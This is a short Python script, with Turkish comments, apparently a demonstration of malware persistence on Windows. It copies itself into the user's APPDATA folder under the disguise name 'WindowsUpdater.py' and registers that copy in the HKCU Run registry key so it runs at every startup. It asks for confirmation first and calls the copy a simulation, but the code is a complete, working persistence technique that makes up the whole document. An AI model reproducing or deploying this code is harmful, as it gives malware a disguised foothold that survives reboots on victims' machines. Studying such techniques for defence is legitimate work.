import os
import shutil
import winreg as reg

print("--- MALWARE PERSISTENCE (RegEdit) ---")

def add_to_registry():
    # Kendi dosya yolunu bul
    file_path = os.path.abspath(__file__)
    
    # Yeni bir isimle gizli bir yere kopyala (Simülasyon)
    new_path = os.path.join(os.environ["APPDATA"], "WindowsUpdater.py")
    shutil.copy(file_path, new_path)
    
    # Registry Anahtarı (HKCU -> Run)
    key_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Anahtarı aç ve değeri yaz
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_val, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdater", 0, reg.REG_SZ, new_path)
        reg.CloseKey(key)
        
        print(f"✅ KALICILIK SAĞLANDI!")
        print(f"Dosya: {new_path}")
        print("Artık bilgisayar her açıldığında bu kod çalışacak.")
        
    except Exception as e:
        print(f"Hata: {e}")

choice = input("Kalıcılık eklensin mi? (E/H): ")
if choice.lower() == 'e':
    add_to_registry()